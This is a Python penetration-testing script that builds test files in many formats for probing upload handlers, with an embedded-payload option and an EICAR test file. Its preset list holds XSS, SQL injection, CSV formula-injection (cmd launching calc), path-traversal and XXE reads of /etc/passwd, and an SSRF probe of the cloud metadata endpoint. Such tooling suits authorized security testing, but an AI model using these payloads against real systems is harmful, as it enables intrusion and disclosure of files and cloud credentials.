#!/usr/bin/env python3
# coding: UTF-8

import argparse
import binascii
import codecs
import io
import os
import platform
import struct
import subprocess

from PIL import Image, ImageDraw, ImageFont
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import B5
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()
SYSTEM = platform.system()

BANNER = r"""[bold cyan]
             _                 _                  _           
            | |               | |                | |          
 _   _ ____ | | ___   ____  _ | |____   ____ ___ | | _   ____ 
| | | |  _ \| |/ _ \ / _  |/ || |  _ \ / ___) _ \| || \ / _  )
| |_| | | | | | |_| ( ( | ( (_| | | | | |  | |_| | |_) | (/ / 
 \____| ||_/|_|\___/ \_||_|\____| ||_/|_|   \___/|____/ \____)
      |_|                       |_|                           

        File Upload Security Tester | by bytewreaker
[/bold cyan]
[dim]  CSV · JPEG · PNG · GIF · WebP · PDF · SVG · TIFF · BMP · ICO · EICAR[/dim]
"""

# ─────────────────────────────────────────
#  FONT RESOLUTION
# ─────────────────────────────────────────

FONT_CANDIDATES = [
    "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
    "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    "/usr/share/fonts/truetype/freefont/FreeSans.ttf",
    "/usr/share/fonts/truetype/ubuntu/Ubuntu-R.ttf",
    "/usr/share/fonts/TTF/DejaVuSans.ttf",
    "/Library/Fonts/Arial.ttf",
    "/System/Library/Fonts/Helvetica.ttc",
    "/System/Library/Fonts/SFNS.ttf",
    "C:/Windows/Fonts/arial.ttf",
    "C:/Windows/Fonts/calibri.ttf",
]

def resolve_font(size=30):
    for path in FONT_CANDIDATES:
        if os.path.exists(path):
            try:
                return ImageFont.truetype(path, size)
            except Exception:
                continue
    try:
        result = subprocess.run(
            ["fc-list", ":lang=en", "--format=%{file}\n"],
            capture_output=True, text=True, timeout=3
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.endswith(".ttf") and os.path.exists(line):
                try:
                    return ImageFont.truetype(line, size)
                except Exception:
                    continue
    except Exception:
        pass
    console.print("[yellow]Warning: No TTF font found, using Pillow default font.[/yellow]")
    return ImageFont.load_default()


# ─────────────────────────────────────────
#  BYTE SIZE PARSER
# ─────────────────────────────────────────

def parse_bytes(byte_str):
    if byte_str is None:
        return None
    s = byte_str.strip().upper()
    try:
        if s.endswith("GB"):
            return int(s[:-2]) * 1024 ** 3
        elif s.endswith("MB"):
            return int(s[:-2]) * 1024 ** 2
        elif s.endswith("KB"):
            return int(s[:-2]) * 1024
        elif s.endswith("B"):
            return int(s[:-1])
        else:
            return int(s)
    except ValueError:
        console.print("[red]Error: Invalid byte size.[/red]")
        return None


# ─────────────────────────────────────────
#  HELPER: base raster image
# ─────────────────────────────────────────

def _base_image(text):
    image = Image.new('RGB', (729, 516), (255, 255, 255))
    draw = ImageDraw.Draw(image)
    font = resolve_font(30)
    draw.text((10, 10), text, fill=(0, 0, 0), font=font)
    return image


# ─────────────────────────────────────────
#  CSV
# ─────────────────────────────────────────

def make_csv(file_path, byte_size=None, payload=None):
    header = f'{payload}\n' if payload else 'Number\n'
    rows = [header, '=3+5\n', '6\n', '=SUM(A2:A3)\n']
    template = ''.join(rows)
    with open(file_path, 'w') as f:
        f.write(template)
        if byte_size and len(template) < byte_size:
            for _ in range(len(template), byte_size, 2):
                f.write('0\n')
    return True


# ─────────────────────────────────────────
#  EICAR
# ─────────────────────────────────────────

def make_eicar(file_path):
    rot13_eicar = 'K5B!C%@NC[4\\CMK54(C^)7PP)7}$RVPNE-FGNAQNEQ-NAGVIVEHF-GRFG-SVYR!$U+U*'
    with open(file_path, 'w') as f:
        f.write(codecs.encode(rot13_eicar, "rot_13"))
    return True


# ─────────────────────────────────────────
#  JPEG
# ─────────────────────────────────────────

def make_jpeg(file_path, text="UploadProbe", payload=None):
    buf = io.BytesIO()
    _base_image(text).save(buf, format='jpeg')
    jpeg_data = buf.getvalue()

    if payload:
        encoded = payload.encode('utf-8', errors='replace')
        length = len(encoded) + 2
        comment_segment = b'\xFF\xFE' + struct.pack('>H', length) + encoded
        jpeg_data = jpeg_data[:2] + comment_segment + jpeg_data[2:]

    with open(file_path, 'wb') as f:
        f.write(jpeg_data)
    return True


# ─────────────────────────────────────────
#  PNG
# ─────────────────────────────────────────

def _build_png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    length = struct.pack('>I', len(data))
    crc = struct.pack('>I', binascii.crc32(chunk_type + data) & 0xFFFFFFFF)
    return length + chunk_type + data + crc

def make_png(file_path, text="UploadProbe", byte_size=None, payload=None):
    buf = io.BytesIO()
    _base_image(text).save(buf, format='png')
    png_data = buf.getvalue()

    iend_pos = png_data.find(b'IEND')
    if iend_pos == -1:
        console.print("[red]Error: IEND chunk not found.[/red]")
        return False
    iend_chunk_start = iend_pos - 4

    extra_chunks = b''

    if payload:
        keyword = b'Comment'
        chunk_data = keyword + b'\x00' + payload.encode('utf-8', errors='replace')
        extra_chunks += _build_png_chunk(b'tEXt', chunk_data)

    if byte_size and len(png_data) + len(extra_chunks) < byte_size:
        pad_size = byte_size - len(png_data) - len(extra_chunks) - 12
        if pad_size > 0:
            extra_chunks += _build_png_chunk(b'eXtr', b'\x00' * pad_size)

    final_data = png_data[:iend_chunk_start] + extra_chunks + png_data[iend_chunk_start:]

    with open(file_path, 'wb') as f:
        f.write(final_data)
    return True


# ─────────────────────────────────────────
#  GIF
# ─────────────────────────────────────────

def make_gif(file_path, text="UploadProbe", payload=None):
    buf = io.BytesIO()
    _base_image(text).save(buf, format='gif')
    gif_data = buf.getvalue()

    if payload:
        encoded = payload.encode('utf-8', errors='replace')
        comment_blocks = b''
        for i in range(0, len(encoded), 255):
            chunk = encoded[i:i+255]
            comment_blocks += bytes([len(chunk)]) + chunk
        comment_ext = b'\x21\xFE' + comment_blocks + b'\x00'
        gif_data = gif_data[:-1] + comment_ext + b'\x3B'

    with open(file_path, 'wb') as f:
        f.write(gif_data)
    return True


# ─────────────────────────────────────────
#  WebP
# ─────────────────────────────────────────

def make_webp(file_path, text="UploadProbe", payload=None):
    image = _base_image(text)
    save_kwargs = {"format": "webp"}
    if payload:
        xmp = (
            '<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>'
            '<x:xmpmeta xmlns:x="adobe:ns:meta/">'
            '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
            '<rdf:Description rdf:about="">'
            f'<dc:description xmlns:dc="http://purl.org/dc/elements/1.1/">{payload}</dc:description>'
            '</rdf:Description></rdf:RDF></x:xmpmeta>'
            '<?xpacket end="w"?>'
        )
        save_kwargs["xmp"] = xmp.encode()
    image.save(file_path, **save_kwargs)
    return True


# ─────────────────────────────────────────
#  TIFF
# ─────────────────────────────────────────

def make_tiff(file_path, text="UploadProbe", payload=None):
    image = _base_image(text)
    save_kwargs = {"format": "tiff"}
    if payload:
        # TIFF supports embedding metadata via tag 270 (ImageDescription)
        exif_data = image.getexif()
        exif_data[270] = payload  # 270 = ImageDescription tag
        save_kwargs["exif"] = exif_data.tobytes()
    image.save(file_path, **save_kwargs)
    return True


# ─────────────────────────────────────────
#  BMP
# ─────────────────────────────────────────

def make_bmp(file_path, text="UploadProbe", payload=None):
    image = _base_image(text)
    buf = io.BytesIO()
    image.save(buf, format='bmp')
    bmp_data = buf.getvalue()

    if payload:
        # BMP has a reserved 4-byte field at offset 6-9 — safe to embed small payloads
        encoded = payload.encode('utf-8', errors='replace')[:4]
        encoded = encoded.ljust(4, b'\x00')
        bmp_data = bmp_data[:6] + encoded + bmp_data[10:]

    with open(file_path, 'wb') as f:
        f.write(bmp_data)
    return True


# ─────────────────────────────────────────
#  ICO
# ─────────────────────────────────────────

def make_ico(file_path, text="UploadProbe", payload=None):
    # ICO works best with power-of-2 sizes
    image = Image.new('RGB', (256, 256), (255, 255, 255))
    draw = ImageDraw.Draw(image)
    font = resolve_font(20)
    draw.text((10, 10), text, fill=(0, 0, 0), font=font)

    buf = io.BytesIO()
    image.save(buf, format='ico', sizes=[(256, 256), (64, 64), (32, 32), (16, 16)])
    ico_data = buf.getvalue()

    if payload:
        # Append payload as a comment after the ICO binary
        # Useful for testing if servers strip or reflect trailing data
        ico_data += b'\x00' + payload.encode('utf-8', errors='replace')

    with open(file_path, 'wb') as f:
        f.write(ico_data)
    return True


# ─────────────────────────────────────────
#  PDF
# ─────────────────────────────────────────

def make_pdf(file_path, text="UploadProbe", payload=None):
    c = canvas.Canvas(file_path, bottomup=False, pagesize=B5)
    c.setFont('Helvetica', 30)
    c.drawString(15, 40, text)
    if payload:
        c.setFillColorRGB(1, 1, 1)
        c.setFont('Helvetica', 1)
        c.drawString(1, 1, payload)
    c.showPage()
    c.save()
    return True


# ─────────────────────────────────────────
#  SVG
# ─────────────────────────────────────────

def make_svg(file_path, text="UploadProbe", payload=None):
    if payload:
        body = f'  <text x="10" y="40" font-size="30">{text}</text>\n  {payload}'
    else:
        body = f'  <text x="10" y="40" font-size="30">{text}</text>'

    svg = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="729" height="516">
{body}
</svg>"""
    with open(file_path, 'w') as f:
        f.write(svg)
    return True


# ─────────────────────────────────────────
#  BATCH MODE
# ─────────────────────────────────────────

SUPPORTED_FORMATS = [
    '.csv', '.jpeg', '.png', '.gif', '.webp',
    '.pdf', '.svg', '.tiff', '.bmp', '.ico'
]

def make_all(base_name, text, payload, byte_size):
    results = []
    dispatch = {
        '.csv':  lambda p: make_csv(p, byte_size, payload),
        '.jpeg': lambda p: make_jpeg(p, text, payload),
        '.png':  lambda p: make_png(p, text, byte_size, payload),
        '.gif':  lambda p: make_gif(p, text, payload),
        '.webp': lambda p: make_webp(p, text, payload),
        '.pdf':  lambda p: make_pdf(p, text, payload),
        '.svg':  lambda p: make_svg(p, text, payload),
        '.tiff': lambda p: make_tiff(p, text, payload),
        '.bmp':  lambda p: make_bmp(p, text, payload),
        '.ico':  lambda p: make_ico(p, text, payload),
    }
    for ext in SUPPORTED_FORMATS:
        path = base_name + ext
        try:
            dispatch[ext](path)
            results.append((ext, path, True))
        except Exception as e:
            results.append((ext, path, str(e)))
    return results


# ─────────────────────────────────────────
#  PRESET PAYLOADS
# ─────────────────────────────────────────

PRESETS = {
    "xss":       '<img src=x onerror=alert(document.domain)>',
    "xss2":      '<svg onload=alert(1)>',
    "xss-svg":   '<script>alert(document.domain)</script>',
    "sqli":      "' OR '1'='1",
    "formula":   "=cmd|'\"/C calc\"'!A0",
    "lfi":       '../../../../etc/passwd',
    "ssti":      '{{7*7}}',
    "xxe":       '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "polyglot":  '<script>alert(1)</script>',
    "ssrf":      '<image href="http://169.254.169.254/latest/meta-data/" />',
}

def list_presets():
    table = Table(title="Built-in Payload Presets", style="cyan")
    table.add_column("Name", style="bold yellow")
    table.add_column("Payload", style="green")
    table.add_column("Best Format", style="dim")
    meta = {
        "xss":      "JPEG, PNG, GIF, WebP, TIFF",
        "xss2":     "SVG, HTML",
        "xss-svg":  "SVG",
        "sqli":     "CSV, PDF",
        "formula":  "CSV",
        "lfi":      "Any",
        "ssti":     "Any",
        "xxe":      "SVG, PDF",
        "polyglot": "Any",
        "ssrf":     "SVG",
    }
    for name, val in PRESETS.items():
        table.add_row(name, val, meta.get(name, ""))
    console.print(table)


# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def parse_args():
    console.print(BANNER)

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        'file_path',
        nargs='?',
        help=(
            'Output file path. Extension determines format.\n'
            'Supported: .csv .jpeg .jpg .png .gif .webp .pdf .svg .tiff .bmp .ico\n'
            'Use "eicar" anywhere in filename for EICAR test file.'
        )
    )
    parser.add_argument('-t', '--text',         default='UploadProbe',  help='Text rendered in image/PDF')
    parser.add_argument('-p', '--payload',       default=None,          help='Payload to embed in file metadata/structure')
    parser.add_argument('-b', '--bytes',         default=None,          help='Target file size e.g. 10KB, 5MB (PNG only)')
    parser.add_argument('--preset', nargs='+', default=None,            help='One or more built-in presets e.g. --preset xss ssrf xxe')
    parser.add_argument('--list-presets',        action='store_true',   help='Show all built-in payload presets and exit')
    parser.add_argument('--all',                 default=None,          metavar='BASENAME',
                        help='Generate all formats at once.\nExample: --all test_upload')

    args = parser.parse_args()

    if args.list_presets:
        list_presets()
        return

    payloads = {}
    if args.preset:
        for p in args.preset:
            if p not in PRESETS:
                console.print(f"[red]Unknown preset '{p}'. Use --list-presets to see options.[/red]")
                return
            payloads[p] = PRESETS[p]
    elif args.payload:
        payloads['custom'] = args.payload
    else:
        payloads['none'] = None

    if args.all:
        for preset_name, payload in payloads.items():
            console.print(f"\n[cyan]Preset: {preset_name}[/cyan] → [green]{payload}[/green]")
            base = f"{args.all}_{preset_name}"
            results = make_all(base, args.text, payload, parse_bytes(args.bytes))
            table = Table(title=f"Results — {preset_name}", style="cyan")
            table.add_column("Format", style="bold")
            table.add_column("File")
            table.add_column("Status")
            for ext, path, status in results:
                if status is True:
                    table.add_row(ext, path, "[green]OK[/green]")
                else:
                    table.add_row(ext, path, f"[red]FAIL: {status}[/red]")
            console.print(table)
        return

    if not args.file_path:
        parser.print_help()
        return

    fp = args.file_path
    byte_size = parse_bytes(args.bytes)

    if '/' in fp:
        dir_path = fp[:fp.rfind('/')]
        if not os.path.exists(dir_path):
            console.print(f"[red]Error: Directory '{dir_path}' does not exist.[/red]")
            return

    if args.bytes and not (fp.endswith('.png') or fp.endswith('.csv')):
        console.print("[red]Error: -b/--bytes is only available for .png and .csv files.[/red]")
        return
    payload = list(payloads.values())[0]
    success = False

    if 'eicar' in fp.lower():
        success = make_eicar(fp)
    elif fp.endswith('.csv'):
        success = make_csv(fp, byte_size, payload)
    elif fp.endswith(('.jpeg', '.jpg')):
        success = make_jpeg(fp, args.text, payload)
    elif fp.endswith('.png'):
        success = make_png(fp, args.text, byte_size, payload)
    elif fp.endswith('.gif'):
        success = make_gif(fp, args.text, payload)
    elif fp.endswith('.webp'):
        success = make_webp(fp, args.text, payload)
    elif fp.endswith('.pdf'):
        success = make_pdf(fp, args.text, payload)
    elif fp.endswith('.svg'):
        success = make_svg(fp, args.text, payload)
    elif fp.endswith(('.tiff', '.tif')):
        success = make_tiff(fp, args.text, payload)
    elif fp.endswith('.bmp'):
        success = make_bmp(fp, args.text, payload)
    elif fp.endswith('.ico'):
        success = make_ico(fp, args.text, payload)
    else:
        console.print("[red]Error: Unsupported file extension.[/red]")
        return

    if success:
        size = os.path.getsize(fp)
        console.print(Panel(
            f"[green]File:[/green]    {fp}\n"
            f"[green]Size:[/green]    {size} bytes\n"
            f"[green]Payload:[/green] {payload or 'none'}",
            title="[bold green]Generated Successfully[/bold green]",
            border_style="green"
        ))
    else:
        console.print("[red]Failed to generate file.[/red]")


if __name__ == '__main__':
    parse_args()